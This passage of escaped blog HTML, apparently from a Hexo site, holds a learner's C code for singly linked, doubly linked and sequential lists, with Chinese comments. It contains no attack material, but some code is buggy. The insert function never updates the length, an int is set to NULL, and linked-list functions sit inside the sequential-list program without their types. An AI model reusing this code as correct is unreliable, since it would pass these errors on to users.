class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs csharp\"><span class=\"hljs-function\">Linklist <span class=\"hljs-title\">Create_Linklist</span>(<span class=\"hljs-params\"><span class=\"hljs-built_in\">int</span> n</span>)</span><br>&#123;<br>    LNode *L,*p,*q;<br>    <span class=\"hljs-built_in\">int</span> i;<br>    L=(LNode*)malloc(<span class=\"hljs-keyword\">sizeof</span>(LNode));<br>    L-&gt;next=NULL;           <span class=\"hljs-comment\">//Head node;</span><br>    q=L;                    <span class=\"hljs-comment\">//q-&gt;L;</span><br>    <span class=\"hljs-keyword\">for</span>(i=<span class=\"hljs-number\">0</span>;i&lt;n;i++)<br>    &#123;<br>        p=(LNode*)malloc(<span class=\"hljs-keyword\">sizeof</span>(LNode));<br>        printf(<span class=\"hljs-string\">&quot;Pelase enter data %d:&quot;</span>,i);<br>        scanf(<span class=\"hljs-string\">&quot;%d&quot;</span>,&amp;p-&gt;data);\t\t\t <span class=\"hljs-comment\">//q=L,p赋值</span><br>        p-&gt;next=NULL;\t\t\t\t\t<span class=\"hljs-comment\">//q=L, p-&gt;NULL</span><br>        q-&gt;next=p;\t\t\t\t\t\t<span class=\"hljs-comment\">//q-&gt;p-&gt;NULL==L-&gt;p-&gt;null;</span><br>        q=p;\t\t\t\t\t\t\t<br>    &#125;\t\t\t\t\t\t\t\t\t<br>    <span class=\"hljs-keyword\">return</span> L;<br>&#125;<br><br><span class=\"hljs-function\"><span class=\"hljs-built_in\">int</span> <span class=\"hljs-title\">InsertData</span>(<span class=\"hljs-params\">Linklist L,ElemType data,<span class=\"hljs-built_in\">int</span> pos</span>)</span><br>&#123;<br>    LNode *p,*s;<br>    <span class=\"hljs-built_in\">int</span> index;<br>    p=L;<br>    index=<span class=\"hljs-number\">-1</span>;\t\t\t\t\t\t<span class=\"hljs-comment\">//index设置为-1，则从0开始计算链表长度</span><br>    <span class=\"hljs-keyword\">while</span>(p&amp;&amp;index&lt;pos<span class=\"hljs-number\">-1</span>)\t\t\t<span class=\"hljs-comment\">//循环找到目标元素的前一个元素</span><br>    &#123;<br>        p=p-&gt;next;<br>        index++;<br>    &#125;<br>    <span class=\"hljs-keyword\">if</span>(!p||index&gt;pos<span class=\"hljs-number\">-1</span>)\t\t\t\t<span class=\"hljs-comment\">//p的下一个为空则不存在；index大于pos则出错；</span><br>    &#123;<br>        printf(<span class=\"hljs-string\">&quot;Wrong position.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">-1</span>;<br>    &#125;<br>    s=(LNode*)malloc(<span class=\"hljs-keyword\">sizeof</span>(LNode));\t<span class=\"hljs-comment\">//创建新空间</span><br>    s-&gt;data=data;\t\t\t\t\t<br>    s-&gt;next=p-&gt;next;\t\t\t<span class=\"hljs-comment\">//s=target</span><br>    p-&gt;next=s;\t\t\t\t\t<span class=\"hljs-comment\">//p-&gt;s,s-&gt;target</span><br>    printf(<span class=\"hljs-string\">&quot;Insert the data successfully.\\n&quot;</span>);<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">1</span>;<br>&#125;<br><br><span class=\"hljs-function\"><span class=\"hljs-built_in\">int</span> <span class=\"hljs-title\">DeleteData</span>(<span class=\"hljs-params\">Linklist L,ElemType *e,<span class=\"hljs-built_in\">int</span> pos</span>)   <span class=\"hljs-comment\">//*e可以获得目标元素的地址</span></span><br>&#123;<br>    LNode *p,*q;<br>    p=L-&gt;next;\t\t\t\t\t\t\t<br>    <span class=\"hljs-built_in\">int</span> index=<span class=\"hljs-number\">-1</span>;<br>    <span class=\"hljs-keyword\">while</span>(p-&gt;next&amp;&amp;index&lt;pos<span class=\"hljs-number\">-1</span>)<br>    &#123;<br>        p=p-&gt;next;<br>        index++;<br>    &#125;<br>    <span class=\"hljs-keyword\">if</span>(!(p-&gt;next)||index&gt;pos<span class=\"hljs-number\">-1</span>)<br>    &#123;<br>        printf(<span class=\"hljs-string\">&quot;Wrong position.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">-1</span>;<br>    &#125;<br>    q=p-&gt;next;<br>    *e=q-&gt;data;\t\t\t\t\t<span class=\"hljs-comment\">//将data传入e</span><br>    p-&gt;next=q-&gt;next;<br>    free(q);<br>    printf(<span class=\"hljs-string\">&quot;Get the data: %d\\n&quot;</span>,*e);<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">1</span>;<br><br>&#125;<br><br><span class=\"hljs-comment\">//合并两个有序链表，且合成的链表也是顺序的</span><br><span class=\"hljs-function\">Linklist <span class=\"hljs-title\">MergeLinklist</span>(<span class=\"hljs-params\">Linklist A,Linklist B</span>)</span><br>&#123;<br>    LNode *pa,*pb,*pc,*C;<br>    pa=A-&gt;next;<br>    pb=B-&gt;next;<br>    C=pc=A;\t\t\t\t\t\t<span class=\"hljs-comment\">//C=A</span><br>    <span class=\"hljs-keyword\">while</span>(pa&amp;&amp;pb)<br>    &#123;<br>        <span class=\"hljs-keyword\">if</span>(pa-&gt;data&lt;=pb-&gt;data)<br>        &#123;<br>            pc-&gt;next=pa;\t\t<span class=\"hljs-comment\">//c-&gt;a1;</span><br>            pc=pa;\t\t\t\t<span class=\"hljs-comment\">//c=a1;</span><br>            pa=pa-&gt;next;\t\t<span class=\"hljs-comment\">//a1=a2</span><br>        &#125;<br>        <span class=\"hljs-keyword\">else</span><br>        &#123;<br>            pc-&gt;next=pb;<br>            pc=pb;<br>            pb=pb-&gt;next;<br>        &#125;<br>    &#125;<br>    pc-&gt;next=pa?pa:pb;<br>    free(B);<br>    <span class=\"hljs-keyword\">return</span> C;<br><br>&#125;<br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">PrintLinklist</span>(<span class=\"hljs-params\">Linklist L</span>)</span><br>&#123;<br>    LNode *p;<br>    p=L-&gt;next;<br>    printf(<span class=\"hljs-string\">&quot;DATA OUTPUT:&quot;</span>);<br>    <span class=\"hljs-keyword\">while</span>(p)<br>    &#123;<br>        printf(<span class=\"hljs-string\">&quot;%d &quot;</span>,p-&gt;data);<br>        p=p-&gt;next;<br>    &#125;<br>    printf(<span class=\"hljs-string\">&quot;\\n&quot;</span>);<br>&#125;<br><br><span class=\"hljs-function\"><span class=\"hljs-built_in\">int</span> <span class=\"hljs-title\">main</span>()</span><br>&#123;<br>    <span class=\"hljs-built_in\">int</span> e;<br><br>    Linklist MyLinklist;<br>    MyLinklist=Create_Linklist(<span class=\"hljs-number\">5</span>);<br>    PrintLinklist(MyLinklist);<br>    InsertData(MyLinklist,<span class=\"hljs-number\">101</span>,<span class=\"hljs-number\">3</span>);<br>    PrintLinklist(MyLinklist);<br>    DeleteData(MyLinklist,&amp;e,<span class=\"hljs-number\">3</span>);    <span class=\"hljs-comment\">//Use &amp; to get data;</span><br>    PrintLinklist(MyLinklist);<br><br><br><br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>二、双向链表</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdlib.h&gt;</span></span><br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-type\">int</span> Elemtype;<br><br><span class=\"hljs-comment\">//节点结构</span><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">DulNode</span>&#123;</span><br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">DulNode</span> * <span class=\"hljs-title\">prior</span>;</span><br>    <span class=\"hljs-type\">int</span> data;<br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">DulNode</span> * <span class=\"hljs-title\">next</span>;</span><br>&#125;DulNode,*DulLinkList;<br><br>DulNode* <span class=\"hljs-title function_\">initDulNode</span><span class=\"hljs-params\">(DulNode * L,<span class=\"hljs-type\">int</span> length)</span>&#123;<br>    <span class=\"hljs-comment\">//创建一个首元节点，链表的头指针为L</span><br>    L=(DulNode*)<span class=\"hljs-built_in\">malloc</span>(<span class=\"hljs-keyword\">sizeof</span>(DulNode));<br>    <span class=\"hljs-comment\">//对节点进行初始化</span><br>    L-&gt;prior=<span class=\"hljs-literal\">NULL</span>;<br>    L-&gt;next=<span class=\"hljs-literal\">NULL</span>;<br>    L-&gt;data=<span class=\"hljs-literal\">NULL</span>;<br>    <span class=\"hljs-comment\">//声明一个指向首元节点的指针，方便后期向链表中添加新创建的节点</span><br>    DulNode *r=L;<br>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-type\">int</span> count=<span class=\"hljs-number\">0</span>; count&lt;length; count++) &#123;<br>        <span class=\"hljs-comment\">//创建新的节点并初始化</span><br>        DulNode *p=(DulNode*)<span class=\"hljs-built_in\">malloc</span>(<span class=\"hljs-keyword\">sizeof</span>(DulNode));<br>        p-&gt;prior=<span class=\"hljs-literal\">NULL</span>;<br>        p-&gt;next=<span class=\"hljs-literal\">NULL</span>;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Please enter data %d:&quot;</span>,count);<br>        <span class=\"hljs-built_in\">scanf</span>(<span class=\"hljs-string\">&quot;%d&quot;</span>,&amp;p-&gt;data);<br>        <span class=\"hljs-comment\">//新节点与链表最后一个节点建立关系</span><br>        r-&gt;next=p;<br>        p-&gt;prior=r;<br>        <span class=\"hljs-comment\">//r永远指向链表中最后一个节点，重点！！！！</span><br>        r=r-&gt;next;<br>    &#125;<br>    <span class=\"hljs-comment\">//返回新创建的链表</span><br>    <span class=\"hljs-keyword\">return</span> L;<br>&#125;<br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">display</span><span class=\"hljs-params\">(DulNode * L)</span>&#123;<br>    DulNode *temp=L-&gt;next;<br>    <span class=\"hljs-keyword\">while</span> (temp) &#123;<br>        <span class=\"hljs-comment\">//如果该节点无后继节点，说明此节点是链表的最后一个节点</span><br>        <span class=\"hljs-keyword\">if</span> (temp-&gt;next==<span class=\"hljs-literal\">NULL</span>) &#123;<br>            <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d\\n&quot;</span>,temp-&gt;data);<br>        &#125;<span class=\"hljs-keyword\">else</span>&#123;<br>            <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d &lt;-&gt; &quot;</span>,temp-&gt;data);<br>        &#125;<br>        temp=temp-&gt;next;<br>    &#125;<br>&#125;<br><br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span> &#123;<br>    <span class=\"hljs-comment\">//创建一个头指针</span><br>    DulNode * L=<span class=\"hljs-literal\">NULL</span>;<br>    <span class=\"hljs-comment\">//调用链表创建函数</span><br>    L=initDulNode(L,<span class=\"hljs-number\">5</span>);<br>    <span class=\"hljs-comment\">//输出创建好的链表</span><br>    display(L);<br>    <span class=\"hljs-comment\">//显示双链表的优点</span><br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<p>CH1 顺序表基本操作及实现（C）</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs csharp\"><span class=\"hljs-meta\">#include&lt;stdio.h&gt;</span><br><span class=\"hljs-meta\">#include&lt;stdlib.h&gt;</span><br><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> MAXSIZE 50</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> Elemtype int </span><br><br>typedef <span class=\"hljs-keyword\">struct</span>&#123;<br>    Elemtype data[MAXSIZE];<br>    <span class=\"hljs-built_in\">int</span> length;<br>&#125;Sqlist;<br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">InitSqlist</span>(<span class=\"hljs-params\">Sqlist *L</span>)</span><br>&#123;<br>    L-&gt;length=<span class=\"hljs-number\">0</span>;<br>    printf(<span class=\"hljs-string\">&quot;Init the list successfully!\\n&quot;</span>);<br>    <span class=\"hljs-keyword\">return</span>;<br>&#125;<br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">CreateSqlist</span>(<span class=\"hljs-params\">Sqlist *L,<span class=\"hljs-built_in\">int</span> temp_data[],<span class=\"hljs-built_in\">int</span> temp_length</span>)</span><br>&#123;<br>    <span class=\"hljs-keyword\">if</span>(temp_length&gt;MAXSIZE)<br>    &#123;<br>        printf(<span class=\"hljs-string\">&quot;Overflow!\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span>;<br>    &#125;<br><br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-built_in\">int</span> index=<span class=\"hljs-number\">0</span>;index&lt;temp_length;index++)<br>    &#123;<br>        L-&gt;data[index]=temp_data[index];<br>    &#125;<br>    L-&gt;length=temp_length;<br>    printf(<span class=\"hljs-string\">&quot;Create the table successfully!\\n&quot;</span>);<br>    <span class=\"hljs-keyword\">return</span>;<br>&#125;<br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">InsertList</span>(<span class=\"hljs-params\">Sqlist *L,Elemtype newData,<span class=\"hljs-built_in\">int</span> temp_position</span>)</span><br>&#123;<br>    <span class=\"hljs-keyword\">if</span>(temp_position&lt;<span class=\"hljs-number\">0</span>||temp_position&gt;L-&gt;length+<span class=\"hljs-number\">1</span>)<br>    &#123;<br>        printf(<span class=\"hljs-string\">&quot;Wrong position!\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span>;<br>    &#125;<br>    <span class=\"hljs-keyword\">else</span><br>    &#123;<br>        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-built_in\">int</span> index=L-&gt;length;index&gt;temp_position;index--)<br>        &#123;<br>            L-&gt;data[index]=L-&gt;data[index<span class=\"hljs-number\">-1</span>];<br>        &#125;<br>        L-&gt;data[temp_position]=newData;<br>        printf(<span class=\"hljs-string\">&quot;Add new data successfully!\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span>;<br>    &#125;<br>&#125;<br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">DeleteDataByElement</span>(<span class=\"hljs-params\">Sqlist *L,Elemtype deletedData</span>)</span><br>&#123;<br>    <span class=\"hljs-built_in\">int</span> counter=<span class=\"hljs-number\">0</span>;<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-built_in\">int</span> index=<span class=\"hljs-number\">0</span>;index&lt;L-&gt;length<span class=\"hljs-number\">-1</span>;index++)<br>    &#123;<br>        <span class=\"hljs-keyword\">if</span>(L-&gt;data[index]==deletedData)<br>        &#123;<br>            counter+=<span class=\"hljs-number\">1</span>;<br>            <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-built_in\">int</span> index1=index;index1&lt;L-&gt;length<span class=\"hljs-number\">-1</span>;index1++)<br>            &#123;<br>                L-&gt;data[index1]=L-&gt;data[index1+<span class=\"hljs-number\">1</span>];<br>            &#125;<br>        &#125;<br>    &#125;<br>    L-&gt;length-=counter;<br>    printf(<span class=\"hljs-string\">&quot;The counter is %d\\n&quot;</span>,counter);<br>    printf(<span class=\"hljs-string\">&quot;Delete the data successfully!\\n&quot;</span>);<br>    <span class=\"hljs-keyword\">return</span>;<br>&#125;<br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">DeleteDataByPosition</span>(<span class=\"hljs-params\">Sqlist *L,<span class=\"hljs-built_in\">int</span> tempDeletePosition</span>)</span><br>&#123;<br>    Elemtype deleted_data;<br>    <span class=\"hljs-keyword\">if</span>(tempDeletePosition&lt;<span class=\"hljs-number\">0</span>||tempDeletePosition&gt;L-&gt;length)<br>    &#123;<br>        printf(<span class=\"hljs-string\">&quot;Wrong position!\\n&quot;</span>);<br>    &#125;<br>    <span class=\"hljs-keyword\">else</span>&#123;<br>        deleted_data=L-&gt;data[tempDeletePosition];<br>        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-built_in\">int</span> index=tempDeletePosition;index&lt;L-&gt;length;index++)<br>        &#123;<br><br>            L-&gt;data[index]=L-&gt;data[index+<span class=\"hljs-number\">1</span>];<br>        &#125;<br>        L-&gt;length--;<br>    &#125;<br>    printf(<span class=\"hljs-string\">&quot;Delete the data successfully!\\n&quot;</span>);<br>    printf(<span class=\"hljs-string\">&quot;The deleted data is %d\\n&quot;</span>,deleted_data);<br>    <span class=\"hljs-keyword\">return</span>;<br>&#125;<br><br><span class=\"hljs-comment\">//按值查找</span><br><span class=\"hljs-function\"><span class=\"hljs-built_in\">int</span> <span class=\"hljs-title\">Locate_Data</span>(<span class=\"hljs-params\">Linklist L,ElemType targetData</span>)</span><br>&#123;<br>    LNode *p;<br>    p=L-&gt;next;<br>    <span class=\"hljs-built_in\">int</span> index=<span class=\"hljs-number\">0</span>;<br>    <span class=\"hljs-keyword\">while</span>(p)<br>    &#123;<br>        <span class=\"hljs-keyword\">if</span>(p-&gt;data==targetData)<br>        &#123;<br>            printf(<span class=\"hljs-string\">&quot;Position:%d.\\n&quot;</span>,index);<br>            <span class=\"hljs-keyword\">return</span> index;<br>        &#125;<br>        index++;<br>        p=p-&gt;next;<br>    &#125;<br>    printf(<span class=\"hljs-string\">&quot;No such a data.\\n&quot;</span>);<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">-1</span>;<br>&#125;<br><br><span class=\"hljs-comment\">//计算链表长度</span><br><span class=\"hljs-function\"><span class=\"hljs-built_in\">int</span> <span class=\"hljs-title\">CountLinklistLength</span>(<span class=\"hljs-params\">Linklist L</span>)</span><br>&#123;<br>    <span class=\"hljs-built_in\">int</span> count=<span class=\"hljs-number\">0</span>;<br>    LNode *p;<br>    p=L-&gt;next;<br>    <span class=\"hljs-keyword\">while</span>(p)<br>    &#123;<br>        count++;<br>        p=p-&gt;next;<br>    &#125;<br>    printf(<span class=\"hljs-string\">&quot;List length : %d.\\n&quot;</span>,count);<br>    <span class=\"hljs-keyword\">return</span> count;<br>&#125;<br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">PrintList</span>(<span class=\"hljs-params\">Sqlist *L</span>)</span><br>&#123;<br>    printf(<span class=\"hljs-string\">&quot;The list is below:\\n&quot;</span>);<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-built_in\">int</span> index=<span class=\"hljs-number\">0</span>;index&lt;L-&gt;length;index++)<br>    &#123;<br>        printf(<span class=\"hljs-string\">&quot;%d &quot;</span>,L-&gt;data[index]);<br>    &#125;<br>    printf(<span class=\"hljs-string\">&quot;\\nThe length is %d\\n&quot;</span>,L-&gt;length);<br>    <span class=\"hljs-keyword\">return</span>;<br>&#125;<br><br><span class=\"hljs-comment\">//不确定是否正确</span><br><span class=\"hljs-comment\">// void EmptyList(Sqlist *L)</span><br><span class=\"hljs-comment\">// &#123;</span><br><span class=\"hljs-comment\">//     free(L-&gt;data);</span><br><span class=\"hljs-comment\">//     L-&gt;length=0;</span><br><span class=\"hljs-comment\">//     return;</span><br><span class=\"hljs-comment\">// &#125;</span><br><br><br><br><span class=\"hljs-function\"><span class=\"hljs-built_in\">int</span> <span class=\"hljs-title\">main</span>()</span>&#123;<br>    <span class=\"hljs-built_in\">int</span> my_data[MAXSIZE]=&#123;<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">5</span>,<span class=\"hljs-number\">6</span>,<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">1</span>&#125;;<br>    <span class=\"hljs-built_in\">int</span> my_length=<span class=\"hljs-number\">10</span>;<br>    Sqlist my_list;<br>    Elemtype 